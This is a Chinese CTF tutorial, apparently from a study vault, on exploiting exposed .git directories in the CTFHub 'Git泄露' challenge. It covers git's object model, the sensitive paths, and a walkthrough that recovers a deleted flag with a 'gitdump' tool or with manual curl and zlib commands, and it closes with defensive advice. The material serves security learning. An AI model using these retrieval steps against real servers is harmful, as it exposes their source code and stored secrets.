## Git泄露 -- 考点精讲

> 前置知识：[[../../Web前置技能/HTTP协议/HTTP协议|HTTP 协议基础]] -- 先了解 HTTP 协议基础再来看本考点

### 原理精讲 -- .git 目录为什么能泄露源码？

#### .git 是什么

`.git` 是 git 版本库的隐藏目录，记录项目的**全部历史**：每次提交的源码快照、提交者、时间、提交信息。Web 服务器配置不当（默认静态目录）时，`/.git/` 可以被直接访问，等于把整个项目的所有历史版本交到攻击者手里。

```mermaid
flowchart LR
    A[开发者用 git 管理网站] --> B[.git/ 随网站上传服务器]
    B --> C[服务器默认允许静态访问 .git/]
    C --> D[/.git/HEAD 可读]
    D --> E[.git/logs/HEAD 泄露全部提交历史]
    E --> F[下载 objects → 还原历史源码]
    F --> G[删除的 flag 在历史提交里找回]
```

#### git 对象模型（三个核心概念）

| 对象 | 内容 | 说明 |
|------|------|------|
| commit | tree 引用 + parent + 提交信息 | 一次提交 = 一个 commit 对象，`parent` 指向前一次提交 |
| tree | 目录快照（文件名 + 类型 + blob 引用） | 一个目录一层 tree |
| blob | 文件原始内容 | 每个文件内容一个 blob，不存文件名 |

对象存于 `/.git/objects/`，按 `前2字符/后38字符` 分目录存放，且**整体 zlib 压缩**，直接 `strings`/`cat` 看到的是乱码。

#### 为什么 git 泄露最致命？

1. **历史删不掉**：开发者在最新提交里删掉 flag 文件，但旧 commit/tree/blob **永远留在 objects 里**，只需下载旧 tree 引用的 blob 就能找回（本题正是如此："add flag" 提交里有 flag，"remove flag" 提交只是把引用指到没有该文件的 tree）
2. **信息量最大**：源码、配置、密码、后门、所有版本全泄露
3. **自动化可还原**：index/logs/HEAD 三件套即可完整重建工作区

#### 关键暴露点

| 路径 | 内容 | 攻击价值 |
|------|------|---------|
| `/.git/HEAD` | 当前分支引用 | 确认存在 git 泄露 |
| `/.git/config` | 仓库配置 | 确认仓库规模 |
| `/.git/index` | 暂存区索引（文件名 + blob sha） | 直接拿当前文件清单 |
| `/.git/logs/HEAD` | **全部提交历史**（old sha → new sha + 提交信息） | 提交次数、信息全暴露 |
| `/.git/objects/xx/xxx...` | 压缩对象 | 还原源码的原料 |

### 注意事项

| 易错点 | 说明 |
|-------|------|
| 对象是 zlib 压缩 | `strings` 解不出内容，需解压后解析对象头（`commit 214\0...`） |
| tree 是二进制 | 文件名后直接跟 20 字节 sha 二进制，用 `xxd`/解析脚本读，不要肉眼抠 |
| **sha 易误读** | tree 里 sha 无分隔符，从乱码输出抠 sha 容易出错（本次踩坑：把 `f0` 读成 `a4`），交给脚本 `hex()` |
| 提交历史要找全 | 只看 HEAD 指向的最新提交会漏掉"删 flag"之前的提交，`logs/HEAD` 是金矿 |
| 文件可能被删 | 最新 commit 里没有的文件，在历史 commit 的 tree 里 |
| 大仓库有 pack | 有些站点 `objects/info/packs` 有 pack 文件（`.git/objects/pack/`），需额外下载 |

### 题目解法

> CTFHub 技能树位置：CTFHub → Web → Web 信息泄露 → Git泄露

> 提示：还原 .git 用专用工具一行搞定（`gitdump URL`，自动下载 index+objects+日志并恢复全部历史文件）。该工具由我们自研，与 [[../../Web工具配置/目录爆破/遍历脚本|trav]]、[[../备份文件下载/DS_Store|dsstore]] 同风格：零依赖、终端原生。

解法（gitdump 工具）：

```bash
# 1. 一条命令：下载 .git 全部对象 → 恢复所有历史提交的文件
gitdump "http://目标/" --out restore
# [*] 日志: 3 次提交
# [+] 提交历史:
#     f9b0dfa  commit (initial): init
#     3cf883e  commit: add flag      <-- flag 在这里
#     cfca75b  commit: remove flag
# [+] 恢复文件: 198112555220625.txt ...

# 2. flag 在历史提交里，直接 cat 恢复出的文件
cat restore/198112555220625.txt
# ctfhub{c5d85e0d460bdd128d845b6d}
```

解法（手工，理解原理）：

```bash
# 1. 确认存在 + 拿提交历史
curl -s "http://目标/.git/logs/HEAD"
# 0000000... f9b0dfa... init
# f9b0dfa... 3cf883e... add flag    <-- 目标提交
# 3cf883e... cfca75b... remove flag

# 2. 下载 commit 对象（zlib 解压看内容）
curl -s "http://目标/.git/objects/3c/f883e0167ebbf3f19af04d9704dad1fdbffa5a" | python3 -c "import zlib,sys; print(zlib.decompress(sys.stdin.buffer.read()).decode())"
# commit 211 tree 2f97c3bf...     <-- 这个 tree 里有 flag

# 3. 下载 tree（二进制，用 python 解析出 blob sha）
curl -s "http://目标/.git/objects/2f/97c3bf9455e13f7178d0a815494bbf46922df6" -o tree.bin
python3 -c "import zlib; print(zlib.decompress(open('tree.bin','rb').read()).hex())"
# 找到 198112555220625.txt 的 blob sha

# 4. 下载 blob 解压即得 flag
curl -s "http://目标/.git/objects/f0/54601a1ea2577941df058417e66726c02691d3" | python3 -c "import zlib,sys; print(zlib.decompress(sys.stdin.buffer.read()).decode())"
# ctfhub{c5d85e0d460bdd128d845b6d}
```

### 同类变式（信息泄露大类）

| 考点 | 说明 | 终端提取 |
|------|------|---------|
| **Git 泄露**（本题） | .git 目录可访问，历史源码全还原 | `gitdump URL` |
| **Git stash 变式** | flag 被 git stash 收进 `refs/stash`（add flag 提交是占位符陷阱） | `gitdump URL`（自动探测），见 [[Stash\|Stash 变式]] |
| **SVN 泄露** | `.svn/` 目录可访问，同原理还原历史 | 专用工具或手工下载 `.svn` 文件 |
| **HG 泄露** | `.hg/` 目录可访问，fncache + revlog 全泄露 | `hgdump URL` |
| **备份文件下载** | 各种备份文件泄露源码/文件清单 | 见 [[../备份文件下载/bak文件\|bak文件]]、[[../备份文件下载/网站源码\|网站源码]] |
| **vim 缓存** | `.index.php.swp` 残留源码 | 见 [[../备份文件下载/vim缓存\|vim缓存]] |
| **DS_Store** | macOS 目录元数据泄露文件清单 | `dsstore --notes URL/.DS_Store`，见 [[../备份文件下载/DS_Store\|DS_Store]] |
| 目录索引泄露 | 目录列表直接可见文件名 | 见 [[../目录遍历\|目录遍历]] |
| phpinfo | 环境变量/配置泄露 | 见 [[../phpinfo\|phpinfo]] |

### 核心知识点总结

| 概念 | 说明 |
|------|------|
| .git 目录 | git 版本库元数据，含全部历史源码快照 |
| 对象模型 | commit（提交）→ tree（目录）→ blob（文件内容） |
| zlib 压缩 | 对象整体压缩，需解压后解析对象头 |
| logs/HEAD | 泄露全部提交历史与提交信息，找"add flag"类提交的关键 |
| 历史不可删 | 文件被删只是引用不指它，旧对象永远在 objects 里 |
| index 文件 | 当前暂存区清单（文件名 + blob sha），可加速恢复 |
| gitdump 工具 | 自研零依赖工具：`gitdump <URL> [--out 目录]` |
| 防御角度 | 部署时不带 .git；服务器禁止访问隐藏目录（nginx `location ~ /\.` 拒绝） |

### 关联教程

- [[Stash|Stash 变式]] -- flag 被 git stash 藏进 refs/stash 的进阶考点
- [[../备份文件下载/DS_Store|DS_Store]] -- dsstore 工具（gitdump 的姊妹工具）
- [[../备份文件下载/bak文件|bak文件]] -- 单文件备份直接泄露源码
- [[../备份文件下载/网站源码|网站源码]] -- 整站压缩包备份
- [[../备份文件下载/vim缓存|vim缓存]] -- vim 交换文件残留
- [[../目录遍历|目录遍历]] -- 目录索引泄露与逐层追踪
- [[../../Web工具配置/目录爆破/遍历脚本|遍历脚本]] -- trav 工具文档
- [[../../Web前置技能/HTTP协议/HTTP协议|HTTP 协议总览]] -- HTTP 基础
- [[../../Web|Web 方向总览]] -- Web CTF 方向入口
- [[../../../ctf解法与理论总目录|CTF 总目录]] -- CTF 理论学习与练习平台
